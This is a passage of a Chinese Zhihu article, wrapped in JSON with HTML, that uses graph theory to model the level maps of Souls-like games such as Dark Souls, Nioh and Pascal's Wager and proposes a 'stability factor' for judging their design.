[{"title":"如何设计一张有“魂味”的地图？——论“类魂”游戏关卡的拓扑结构","date":"2021-09-29 10:04:23","description":"\n<p></p>\n<h2>摘要</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在本文中，我们试图探究“类魂”游戏(3D银河恶魔城类游戏)关卡存在的数学上的普遍性设计原理。</p>\n<p>基于一种原胞自动机方法<a href=\"https://link.zhihu.com/?target=https%3A//dl.acm.org/doi/abs/10.1145/1814256.1814257\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[1]</a> ，可以一般的将关卡地图划分成“开放区域(Open Aera)”、“路径(Path)”与“兴趣点(POI)”，三类元素相互组合。此时可以得到与该关卡一一对应的、抽象的逻辑图结构。</p>\n<p>据此，我们选取了五款主流的“类魂”游戏(《黑暗之魂1》、《黑暗之魂3》、《血源诅咒》、《仁王1》、《帕斯卡契约》)，并对五款游戏当中的84张地图进行了解析性分析。利用图论、拓扑学等数学工具，我们分别计算了总共84张地图各自的“稳定因子” <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值。( <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 定义见4.3小节)</p>\n<p>结果表明，《黑暗之魂1》中46%地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值介于0.94~1之间；《黑暗之魂3》中57%地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值介于0.91~0.94之间；对于《仁王》，有81%地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值小于0.91。</p>\n<p>证明了《黑暗之魂1》、《黑暗之魂3》、《仁王》这三款游戏的关卡地图设计逻辑存在本质上的差异。</p>\n<p>调研统计结果又显示，玩家对于“类魂”游戏各个地图关卡设计的满意度，高度相关于地图的“稳定因子” <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 。在统计上，地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值是和玩家给出的反馈呈正相关的 —— 一个定性的分析是： <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值愈高，玩家评价愈好。表明“稳定因子”的确是关于关卡设计评价标准的有效观测量。</p>\n<p>因此对于一个以探索性为主要驱动的合格“类魂”游戏/3D银河恶魔城类游戏，我们认为至少需要保证其单关卡地图的 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值大于0.94。</p>\n<p>在文章的最后，基于该原理，我们试图修整《帕斯卡契约》当中不满足 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 值大于0.94的地图，将其改造为“中 <img src=\"https://www.zhihu.com/equation?tex=%5Cgamma\" alt=\"\\gamma\" eeimg=\"1\"> 普适类”的类似于《魂3》的关卡——这个是一个可批判性的结果，如果本文的结论正确，那么这个被修整过的新地图理应得到玩家更高的评价。</p>\n<p><b>关键词：</b><i>游戏科学，关卡设计，类魂游戏，图论，拓扑学</i></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>前言</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>首先声明，本文虽然采用了期刊样的论文格式，但是在文章内容和遣词造句方面会随意很多，并不会遵守那些规矩。因为本文的目标读者，是广大热爱黑魂的普通玩家、想深入研究游戏机制的高端玩家、地图类Mod的制作者、新手策划、独立类魂游戏设计者，正在开发类魂游戏原型的开发者等等，而不是标准的科研工作者。为了能较好的传达笔者的研究成果，笔者会尝试用一种偏向科普式的讲法。类似于聊天一样，笔者会拿出一些很具体的实例去分析，尽量让不了解图论的读者也能很好的get到本文的核心观点。</p>\n<p>在开始介绍研究成果之前，笔者会用较大的文字量去介绍“我们写这篇文章的目的”，是因为笔者希望观点千差万别的各类读者讲清楚，我们是在对过往“玩家&amp;策划”二元叙事的扬弃，站在一个新的第三者中立视角去审视游戏关卡设计的更底层的数理逻辑。笔者真诚的希望各位读者在阅读本文之后，可以有所收获。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2><b>背景</b></h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>我们为什么要写这篇文章？</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>自2009年From Software社由宫崎英高执掌的《恶魔之魂》发售至今的十二年里，总共产出了六部质量极高的、冠以“魂类”之名的作品。以其较高的难度性、键位简单但不失趣味的战斗玩法、精巧复杂的关卡地图设计、暗黑晦涩的文艺叙事，收获了核心玩家群体无数赞誉。特别是在2018年3月份，《只狼：影逝二度》（下文简称为《只狼》）发售之后，乘着直播业兴起的东风，依靠前五代作品的人气积累，再加上作品本身的话题性。《只狼》成功出圈，吸引了大批原本非单机游戏玩家以及非动作类游戏玩家群体。以往作为“小众”的“魂类”游戏，在TGA游戏大赏上，得票超过小岛秀夫的《死亡搁浅》，夺下了“年度最佳游戏(GOTY)”桂冠。</p>\n<p>与《只狼》大火相对应的，是市场的迅速响应，并出现了一大批质量良莠不齐的“类魂（Soul's Like）”游戏。</p>\n<p>2017年光荣社发售的游戏《仁王》，总监安田文彦在采访中表示，关卡设计受到了《黑暗之魂3》（下简称《魂3》）的启发。</p>\n<p>2018年在E3游戏展亮相的《帕斯卡契约》（下简称《帕斯卡》），刚一亮相就被称作“国产黑魂手游”而备受期待。</p>\n<p>2019年万代旗下的《噬神者》团队，将黑魂的设计理念，结合了自身共斗游戏的经验，推出了“二次元共斗类魂”作品《噬血代码》。</p>\n<p>2020年，利用UE4制作的“类魂”游戏《致命躯壳》在Epic发售，引发国内最大游戏论坛NGA版上，新一轮对“类魂”游戏标准的大讨论。</p>\n<p>2021年9月17日，国产克苏鲁风“类魂”游戏《明末：渊虚之羽》发布演示pv，引起玩家群体热议。(紧跟时事)</p>\n<p>这些被冠以“类魂”之名的作品，往往一经出世就背负着极大的争议，褒贬具存。而当我们去询问那些抱有质疑的玩家，对这些作品的不满源自哪里，他们的回答往往是惊人的一致</p>\n<p>——“没有<b>‘魂味’</b>”。</p>\n<p>那么请问，什么是<b>“魂味”</b>？</p>\n<p>更深入一点的问：“谁有权力定义<b>‘魂味’</b>？”</p>\n<p>在这个问题当中，显而易见的存在两种语境——来自<b>游戏玩家</b>的阐述，以及来自<b>游戏设计者</b>的阐述。</p>\n<p>在<b>玩家</b>的视角下，似乎在很多意义上，所谓的“高端玩家”化身成为了一种意见领袖，他们的测评成为了对该游戏有没有“魂味”评判锚点。常常有新人对某些游戏机制发出质疑的时候，会被一些老Ass（笔者注：对魂圈高玩的俗称）教导：“你操作太菜了”，或者“你玩到后期就会喜欢了”。亦或者他们会举出一些诸如“近路多少”、“篝火设置”，“难度曲线”的例子，再用“黑魂里却如何如何”进行对比，以此佐证这款游戏确实有或者没有“魂味”</p>\n<p>在<b>设计者</b>视角下我们当然可以举出更多的例子来，我们可以去拆解一款游戏，是否有纯净UI、系统便于学习、关卡良好引导、战斗机制丰富、键位逻辑合理、摄像机视角跟随、美术素材精良、状态机中动画衔接流畅等等。设计者写反推案时，可以画出一个大大的思维树状图，以详细的分类给出，黑魂具有哪些游戏要素。而只要我做出的游戏有这些要素，那么我就是一个“好”的类魂游戏。</p>\n<p>但是，这两种视点，无论哪一个，都是一种，基于自身经验的事实判断去推演一种价值判断的唯象表述，他的论述逻辑是这样的：什么是<b>“魂味”</b>？像《黑魂》的就是有<b>魂味</b>；为什么《黑魂》设计的好？因为黑魂有<b>“魂味”</b>。</p>\n<p>这是显然一种典型的循环论证，因而不可能给出一个可证伪的科学评判。</p>\n<p>一个比较现实的讽刺例子是，《仁王》的总监安田文彦在接受采访时，面对玩家“游戏不好玩”的质疑，他直言不讳的表达了自己的疑惑：“这么好玩的游戏，为什么大家不喜欢呢？”</p>\n<p>而本文要做的，就是打破这种循环论证，给魂系列的游戏和宫崎英高本人“祛魅”。</p>\n<p>转而利用客观的理性工具，去定量化、理论性、批判性的研究全体的“魂类”和“类魂”游戏。打破原有的“魂类”游戏(特指魂、血、狼)=好游戏，模仿宫崎英高“类魂”游戏=坏游戏的二元叙事。我们纵向剖开各个游戏，将游戏本身打碎，以各个关卡为单位进行研究。</p>\n<p>须知，“魂类”游戏里面有“好”关卡，也有“坏”关卡，“类魂”游戏里面也有“好”关卡和“坏”关卡。“魂类”游戏里的“好”、“坏”关卡各占比多少？“类魂”游戏里的“好”、“坏”关卡又各占比多少？“好”关卡有什么通性？“坏”关卡又有什么通性？我们向上综合，理性抽象出一个优秀的3D银河恶魔城类游戏的一般性设计原理。</p>\n<p>我们试图建立起这样一种理论：无论是否玩过黑魂，无论游戏技术高低，无论设计水平高低，当我去游玩一款“类魂”游戏时，都有这么一套行之有效的方法，可以让我对这款游戏设计的是否“优秀”，是否“有魂味”，做一个定量性的判断。</p>\n<p>在对于黑魂的民间研究工作中，关于黑魂关卡的数值设计和机制设计，已经有了比较好的研究成果<a href=\"https://zhuanlan.zhihu.com/p/86251818\" class=\"internal\">[2]</a> <a href=\"https://zhuanlan.zhihu.com/p/54492745\" class=\"internal\">[3]</a> <a href=\"https://zhuanlan.zhihu.com/p/33679462\" class=\"internal\">[4]</a> <a href=\"https://link.zhihu.com/?target=https%3A//gameinstitute.qq.com/community/detail/110731\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[5]</a> <a href=\"https://link.zhihu.com/?target=http%3A//gamestudies.org/1501/articles/vella/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[6]</a>。</p>\n<p>本文的着眼点，将会是一个更宽泛的命题——黑魂的关卡地图的逻辑结构设计。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>为什么是图论？为什么恰好是图论？</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>在1735年东普鲁士的 (加里宁格勒) 柯尼斯堡市区跨普列戈利亚河两岸，河中心有两个小岛。小岛与河的两岸有七条桥连接。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ce5850607662850c38bc2d95965a6e0a_b.jpg\" data-size=\"normal\" data-rawwidth=\"302\" data-rawheight=\"238\" class=\"content_image\" width=\"302\"><figcaption>欧拉时代的柯尼斯堡地图，显示了当时七座桥的实际位置，河流和桥梁分别用蓝色和绿色标出</figcaption></figure><p>有人突发奇想：在所有桥都只能走一遍的前提下，如何才能把这个地方所有的桥都走遍？</p>\n<p>问题提出后，很多人对此很感兴趣，在茶余饭后纷纷进行试验，但在相当长的时间里，始终未能解决。怎么才能找到成功走过每座桥而不重复的路线呢？因而形成了著名的“柯尼斯堡七桥问题”（Seven Bridges of Konigsberg Problem）。</p>\n<p>这个问题是图论中的著名问题,也是世界上第一个图论问题。最终被当时的著名数学家欧拉所解决。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>我们先暂且停下，从一个数学家的视角，欧拉将这个谜题称之为“问题(Problem)”。那么，如果我们从一个玩家或者策划的角度出发呢？</p>\n<p>根据著名游戏设计师特雷西·富勒顿(Tracy Fullerton)表述的观点<a href=\"https://link.zhihu.com/?target=https%3A//www.amazon.cn/dp/B01EIE3L7W\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[7]</a>，构成一个游戏的四个必须要素是：</p>\n<p><b>空间(Space)</b></p>\n<p><b>规则(Rule)</b></p>\n<p><b>决策(Decision)</b></p>\n<p><b>目标(Target)</b></p>\n<p>对于“柯尼斯堡七桥”而言，我们具有</p>\n<p>游戏<b>空间</b>——柯尼斯堡普列戈利亚河上的桥与河岸</p>\n<p>任务<b>规则</b>——每条桥梁只能走一遍；</p>\n<p>玩家<b>决策</b>——行人可以自由的选择起始地点，以及过桥的顺序；</p>\n<p>胜利<b>目标</b>——所有的桥都走过一遍。</p>\n<p>是的，你没看错。在玩家或者策划的眼中，“柯尼斯堡七桥”不再是一个问题(Problem)，而是一个游戏(Game)，名叫“柯尼斯堡七桥游戏”(Seven Bridges of Konigsberg Game)。更一般的可以看出，鉴于这个游戏空间并不是任意一点可达的(桥下的河水对行人来说不可达)，玩家(行人)被严格限制了探索区域，因此它不是一个开放世界，“柯尼斯堡七桥游戏”是一个事实上的<b>“箱庭式关卡”</b>。从游戏的角度来说，柯尼斯堡七桥本身也大抵是世界上最早的一批箱庭式关卡设计之一。</p>\n<p>我们回到数学家视角，来继续看欧拉的故事，欧拉是如何解决这个问题的呢？</p>\n<p>他在论文《柯尼斯堡的七桥》中，证明符合条件的走法并不存在，也顺带提出和解决了一笔画问题，成为图论史上第一篇重要文献。欧拉把实际的抽象问题简化为平面上的点与线组合，每一座桥视为一条线，桥所连接的地区视为点。这样若从某点出发后最后再回到这点，则这一点的线数必须是偶数，这样的点称为偶顶点。相对的，连有奇数条线的点称为奇顶点。欧拉论述了，由于柯尼斯堡七桥问题中存在4个奇顶点，它无法实现符合题意的遍历。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-8bf61f9abf0891abc74da5e0b33b6eb3_b.jpg\" data-size=\"normal\" data-rawwidth=\"2814\" data-rawheight=\"1126\" class=\"origin_image zh-lightbox-thumb\" width=\"2814\" data-original=\"https://pic4.zhimg.com/v2-8bf61f9abf0891abc74da5e0b33b6eb3_r.jpg\"><figcaption>欧拉将7座桥抽象成了一根线，4处河岸抽象成了一个点，问题就被化简成了，分析这个4点7边的“图”的结构问题</figcaption></figure><p>而这些解析，最后发展成为了数学中的图论。</p>\n<p>由此，借用这样一种“知识考古学”的办法追本溯源，我们成功在数学与游戏科学之间架起来一座桥梁——作为古典图论的源头，“柯尼斯堡七桥问题”既然也可以被诠释为一款箱庭式关卡游戏，并且这个游戏的“解法”是欧拉使用图论最终给出的。那么一个合理的反推是:我们有理由相信，得到了充分发展的现代图论，可以成为我们今日分析电子游戏当中箱庭式关卡的利器。同时，也指出了本文这套方法论的适用范围——即，3D银河恶魔城类游戏当中的箱庭式关卡。</p>\n<p>类魂游戏，作为近十年来最经典的3D银河恶魔城类游戏，拥有清晰可辨的箱庭式关卡特征，这就是我们选择图论对其分析的缘由。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h2>类魂关卡中的图结构</h2>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<h3>自然逻辑图</h3>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>利用图论分析游戏关卡的做法，并非笔者本人的独创。早在2002年，Adams.David的一篇文章<a href=\"https://link.zhihu.com/?target=http%3A//www.dcs.shef.ac.uk/intranet/teaching/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[8]</a>，就已经开始尝试使用计算机图论的方法平台跳跃类游戏的地图。随后历经几位计算机图论专家的发展<a href=\"https://link.zhihu.com/?target=https%3A//arc.aiaa.org/doi/abs/10.2514/1.A32578\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[9]</a> <a href=\"https://link.zhihu.com/?target=https%3A//www.proquest.com/openview/6a4c85b91e946807103f93fd56826147/1%3Fpq-origsite%3Dgscholar%26cbl%3D18750\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[10]</a> <a href=\"https://link.zhihu.com/?target=http%3A//gamestudies.org/0601/articles/dormans\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[11]</a>.</p>\n<p>到了2010年，Joris Dormans撰写的《Adventures in Level Design》一文<a href=\"https://link.zhihu.com/?target=https%3A//dl.acm.org/doi/abs/10.1145/1814256.1814257\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[1]</a>开始进入箱庭式关卡设计领域。在这项工作中，他试图利用图论的方法“有限开圆覆盖”划分出一张地图的“开放区域”，这张地图就是著名游戏《塞尔达传说：黄昏公主》当中的地图关卡：森林寺庙。借此，Joris Dormans实现了将关卡的“Space”（空间几何属性）转化为“Mission”（任务逻辑属性）。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f70a9e16ab7dbe3f39f41ca357c21694_b.jpg\" data-size=\"normal\" data-rawwidth=\"1119\" data-rawheight=\"773\" class=\"origin_image zh-lightbox-thumb\" width=\"1119\" data-original=\"https://pic1.zhimg.com/v2-f70a9e16ab7dbe3f39f41ca357c21694_r.jpg\"><figcaption>《塞尔达传说：暮光公主》在“森林寺庙”关卡的几何空间与任务空间，图片源自Joris Dormans的《Adventures in Level Design》一文</figcaption></figure><p>Joris Dormans后续的文章则继续探讨了计算机生成类似关卡的生成语法(Generative Gammar)方案。本文的思路与之不同，我们并不在意如何生成地图，我们是要探寻如何评价地图。分析利用已经被游戏设计者们设计出来的地图，分析那些被玩家认为是“好”的地图是否具有一般性的结构。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>另一方面，是对于魂系关卡的科学量化研究。在2016年，乌普萨拉大学的Valdemar Ribbing, Laban Melander两位科研工作者试图利用对兴趣点、捷径等交互要素的统计，来给予关卡评价以更定量性的判据<a href=\"https://link.zhihu.com/?target=http%3A//www.diva-portal.org/smash/get/diva2%3A935733/FULLTEXT01.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[12]</a>。不过受制于早期不成熟解包工具的限制，很多数据只能通过游戏内比照来定标。</p>\n<p>近些年来，随着魂系游戏反编译技术的成熟。作为一个后继者，我们不妨直接借鉴前人的成果。第一步，就是要对《黑暗之魂1》、《黑暗之魂3》、《血源诅咒》、《仁王1》、《帕斯卡契约》这五款游戏的总共84张地图进行剖分。</p>\n<p>首先，我们需要定义一些“类魂”游戏关卡地图当中，常见游戏元素的概念。</p>\n<p><b>1.兴趣点(POI,Point Of Interest)</b></p>\n<p>游戏当中可以吸引玩家兴趣、引导游戏流程、维持心流体验的可交互元素。主要表现为：篝火(存档点)、可捡拾的宝物、敌人、宝箱、可交互NPC、掉落的素材/增益道具，或者特殊的灯光、建筑、奇观等等。</p>\n<p><b>2.开放区域(Open Aera)</b></p>\n<p>在关卡中，由一簇POI所框定的一块可探索区域，一般具有明晰的独立于其他开放区域的地标、独立的敌人AI适用区域(NavMesh)、美术风格或素材等。在我们的绘图中，普通的开放区域用<b><i>绿色圆圈</i></b>标出。</p>\n<p><b>3.路径(Path)</b></p>\n<p>用于给予各个开放区域的连接关系的线型结构，一般不含有POI。</p>\n<p><b>4.存档点(Point Of Save&amp;Load)</b></p>\n<p>POI的一种，玩家可以在关卡当中的此处，进行休整、升级、传送、回复、配队、备战等等操作。与该POI交互时，系统会记录玩家的状态，刷新地图时会将玩家位置重置到最近一次使用的存档点处。在魂系列里，被称作“篝火”；仁王系列为“神社”；血源诅咒为“提灯”；帕斯卡为“祭坛”。初始点由于其在整个关卡中的重要地位，会被自动划分成一个开放区域。在我们的绘图中，用<i><b>橙色圆圈</b></i>标出。</p>\n<p><b>5.初始点(Point Of Start)</b></p>\n<p>开放区域的一种，玩家第一次进入该地图关卡所处的位置，一般来讲此处的POI是篝火(存档点)。初始点由于其在整个关卡中的重要地位，会被自动划分成一个开放区域。在我们的绘图中，用<b><i>蓝色圆圈</i></b>标出。</p>\n<p><b>6.Boss点(Point Of Boss)</b></p>\n<p>开放区域的一种，POI一般为该关卡区域中最强力的敌人。到达Boss点往往意味着关卡探索的结束。Boss点由于其在整个关卡中的重要地位，会被自动划分成一个开放区域。在我们的绘图中，用<b><i>红色圆圈</i></b>标出</p>\n<p><b>7.全连通路径(Undirected Path)</b></p>\n<p>路径的一种，在我们的绘图当中，利用A —— B或A <img src=\"https://www.zhihu.com/equation?tex=%5Cleftrightarrow\" alt=\"\\leftrightarrow\" eeimg=\"1\"> B来表示。这个连线符号，代表A、B两个开放区域之间是完全连通的关系，从A点出发可以无条件进入B点，从B点出发也可以无条件进入A点。</p>\n<p><b>8.单向路(Directed Path)</b></p>\n<p>路径的一种，在我们的绘图当中，用A <img src=\"https://www.zhihu.com/equation?tex=%5Crightarrow\" alt=\"\\rightarrow\" eeimg=\"1\"> B 来表示，从A点出发可以进入B点，但从B点出发不可以进入A点而不经过其他区域。具体例子如：悬崖，可跳跃平台，滑坡(这种是物理意义上跳过去就回不来的路)；或者剧情意义上的单向传送(黑魂猎王之后传送舞娘、帕斯卡艾尔玛剧情战斗、黑魂1黑暗大蛇、血源诅咒被布袋哥抓进未见村等。)</p>\n<p><b>9.单向门(ShortCut)</b></p>\n<p>路径的一种，在我们的绘图当中，以</p>\n<p>A—&gt;—B</p>\n<p>或</p>\n<p>A—)—B</p>\n<p>或</p>\n<p>A <img src=\"https://www.zhihu.com/equation?tex=%5Cleftarrow%5Crightharpoonup\" alt=\"\\leftarrow\\rightharpoonup\" eeimg=\"1\"> B</p>\n<p>这三种符号均代表，第一次到达B点时，玩家无法进入A点。但当玩家到达A点开启该单向门之后，A、B两点变为完全连通状态。俗称“捷径”、“近路”。主要表现形式有：单侧可打开的门、可放下的梯子、需要踩动的电梯、可断裂的石碑、可踢倒的大树、需要转动的旋转楼梯等等</p>\n<p><b>10.机关门(Mechanism)</b></p>\n<p>路径的一种，我们标注为</p>\n<p>A <img src=\"https://www.zhihu.com/equation?tex=%5Cbullet\" alt=\"\\bullet\" eeimg=\"1\"> ——&gt;B</p>\n<p>用于表示需要钥匙、特殊机关、等级锁、剧情锁等才能从A点开启的通向B点的路径。尽管同样在第一次到达B点时无法进入A点，但与单向门不同，A点亦是到达不了的，也无从谈起从A点反向到达B点。玩家需要在B点之前的区域探索、成长，直到满足某一需求(找到钥匙、特殊机关；升级到足够的等级、做了特殊任务等)，才能从B点进入A点。举例：黑魂1拿王器开金色大门；血源诅咒治愈教会上层、未见村后侧、通向禁忌森林的大门；魂3大书库大门、法兰要塞大门；仁王地图的等级锁；帕斯卡赐福之地四神柱等。</p>\n<p>在我们后续的讨论中，称初始点、存档点、Boss点为“不动点”，单向门、单向路、机关门称为“不动键”或“特殊键”。(至于为何如此称呼请见下文)。</p>\n<p>鉴于84张地图数量实在太多，无法每一张都详细展示说明。我们将绘制出的地图逻辑图全部附在附录“类魂关卡自然逻辑图一览”里面。(流泪了，鬼知道这么多张地图，我们这个只有两个人的研究团队，为了确定每一处最细小的悬崖，到底进游戏跑了多少遍地图才勉强画完，这种dirty work尽管收益很低，耗费时间最多，但又不得不做的，人都麻了。笔者按)</p>\n<p>笔者特别精心挑择了如下三张地图：《仁王1》恶鬼栖息之岛、《黑魂3》幽邃教堂、《帕斯卡契约》伊瑟流姆，进行实例性的解说，讲述如何将从空间结构变换为逻辑的结构。</p>\n<p><b>Step1：</b>选取POI，对POI进行圆覆盖</p>\n<p>我们引用同好手绘的《仁王1》恶鬼栖息之岛攻略地图<a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/BV1vb411E7TS\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[13]</a></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cab44ac9ef4a9f88c0a5574a2a6573fa_b.jpg\" data-size=\"normal\" data-rawwidth=\"1601\" data-rawheight=\"752\" class=\"origin_image zh-lightbox-thumb\" width=\"1601\" data-original=\"https://pic3.zhimg.com/v2-cab44ac9ef4a9f88c0a5574a2a6573fa_r.jpg\"><figcaption>《仁王1》恶鬼栖息之岛攻略地图</figcaption></figure><p>对于恶鬼栖息之岛这张地图，一个比较理想的选取POI的方法，就是取木灵(对没有玩过仁王的读者：一种可以给主角加强力Buff的特殊收集要素)、场景中的水桶(对没有玩过仁王的读者：可以灭掉场中不可进入的火区，相当于钥匙)、以及开启宅门的钥匙。</p>\n<p>接下来，我们要用一个圆去覆盖各个我们选中的POI，并且我们要求逐渐的去“吹大”(For Expert:双连续映射)这个圆，直到发生下述三种情况之一时，我们才停止扩张这个圆：</p>\n<p>1.如果继续扩大圆的半径，会导致包含进圆内的点与圆心之间不存在一条通路(这条保证了圆内各点都是同一“开放区域”)</p>\n<p>2.如果圆周接触了某个地图上的特殊键(这条保证所有特殊键都能被画出</p>\n<p>3.该圆与其他圆相切(这条保证各个“开放区域”相互独立)</p>\n<p>选取POI，并不是完全随意的，这个不随意性就在于，我们进行了圆覆盖之后的这张图，必须满足这个条件：</p>\n<p><b>所有特殊键都已经落在覆盖地图的任一个圆的圆周上。</b></p>\n<p>此时，我们称这个圆覆盖是“合法(Legal)”的。</p>\n<p>对于恶鬼栖息之岛这张图而言，我们得到的圆覆盖如下图所示：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-f1ac477fd916b9ce6dc46daa1538ef4f_b.jpg\" data-size=\"normal\" data-rawwidth=\"2001\" data-rawheight=\"913\" class=\"origin_image zh-lightbox-thumb\" width=\"2001\" data-original=\"https://pic4.zhimg.com/v2-f1ac477fd916b9ce6dc46daa1538ef4f_r.jpg\"><figcaption>《仁王1》恶鬼栖息之岛地图各个开放区域的划分</figcaption></figure><p>这样，按照我们对“开放区域”的定义“在关卡中，由一簇POI所框定的一块可探索区域”，就这样被划分好了。</p>\n<p><b>Step2：</b>依照各个开放区域之间的连通关系，将他们顺次连接</p>\n<p>这一步没什么好细讲的，按照我们之前的全连通路径、单向路、单向门、机关门四种连通形式去连接就好了，对恶鬼栖息之岛，得到如下结果</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-e26af11443a677c012715c13f0d541af_b.jpg\" data-size=\"normal\" data-rawwidth=\"2060\" data-rawheight=\"940\" class=\"origin_image zh-lightbox-thumb\" width=\"2060\" data-original=\"https://pic4.zhimg.com/v2-e26af11443a677c012715c13f0d541af_r.jpg\"><figcaption>利用四种键的定义，绘制出各个开放区域之间的联系</figcaption></figure><p><b>Step3：</b>将开放区域抽象成点、各区域之间连通性质抽象成键，从地图背景上取下，整理绘制出该关卡的“自然逻辑图”</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ad0cdaff8b4c7f962fe715abdd16d6ca_b.jpg\" data-size=\"normal\" data-rawwidth=\"1114\" data-rawheight=\"878\" class=\"origin_image zh-lightbox-thumb\" width=\"1114\" data-original=\"https://pic3.zhimg.com/v2-ad0cdaff8b4c7f962fe715abdd16d6ca_r.jpg\"><figcaption>去掉地图背景，整理得到自然逻辑图</figcaption></figure><p>这样，《仁王》恶鬼栖息之岛关卡的自然逻辑图就画好了。</p>\n<p>依照同样的原理，我们可以绘制《黑魂3》幽邃教堂的关卡自然逻辑图。<a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/video/av29599136\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[14]</a></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-0f59d226ac4ce10caef7e7a0a219c86e_b.jpg\" data-size=\"normal\" data-rawwidth=\"2001\" data-rawheight=\"2240\" class=\"origin_image zh-lightbox-thumb\" width=\"2001\" data-original=\"https://pic3.zhimg.com/v2-0f59d226ac4ce10caef7e7a0a219c86e_r.jpg\"><figcaption>《黑魂3》幽邃教堂地图与开放区域划分</figcaption></figure><p>依次画出连通路径，有</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-457a458d012ea2b6fdd50e8daf6a2ada_b.jpg\" data-size=\"normal\" data-rawwidth=\"2001\" data-rawheight=\"1122\" class=\"origin_image zh-lightbox-thumb\" width=\"2001\" data-original=\"https://pic3.zhimg.com/v2-457a458d012ea2b6fdd50e8daf6a2ada_r.jpg\"><figcaption>绘制出各个开放区域之间的联系</figcaption></figure><p>整理得到</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7cff0697143b8ddc6d59d933eb2a5407_b.jpg\" data-size=\"normal\" data-rawwidth=\"1133\" data-rawheight=\"685\" class=\"origin_image zh-lightbox-thumb\" width=\"1133\" data-original=\"https://pic4.zhimg.com/v2-7cff0697143b8ddc6d59d933eb2a5407_r.jpg\"><figcaption>幽邃教堂自然逻辑图</figcaption></figure><p>类似的，对于《帕斯卡契约》伊瑟流姆，引用同好的手绘地图<a href=\"https://link.zhihu.com/?target=https%3A//www.bilibili.com/read/cv6739466\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[15]</a>，我们有</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-fd08e28a7e2faaa3df07ce8a2428d689_b.jpg\" data-size=\"normal\" data-rawwidth=\"1557\" data-rawheight=\"1126\" class=\"origin_image zh-lightbox-thumb\" width=\"1557\" data-original=\"https://pic2.zhimg.com/v2-fd08e28a7e2faaa3df07ce8a2428d689_r.jpg\"><figcaption>《帕斯卡契约》伊瑟流姆地图与开放区域划分</figcaption></figure><p>用四种连通关系连接各个开放区域</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-7c14bfc5d5e5a847979f4934a8d54e71_b.jpg\" data-size=\"normal\" data-rawwidth=\"842\" data-rawheight=\"1207\" class=\"origin_image zh-lightbox-thumb\" width=\"842\" data-original=\"https://pic2.zhimg.com/v2-7c14bfc5d5e5a847979f4934a8d54e71_r.jpg\"><figcaption>伊瑟流姆各开放区域之间的连通关系</figcaption></figure><p>整理得到伊瑟流姆自然逻辑图</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-35deda4ddc2044f8fc4cfcae2340df39_b.jpg\" data-size=\"normal\" data-rawwidth=\"1032\" data-rawheight=\"708\" class=\"origin_image zh-lightbox-thumb\" width=\"1032\" 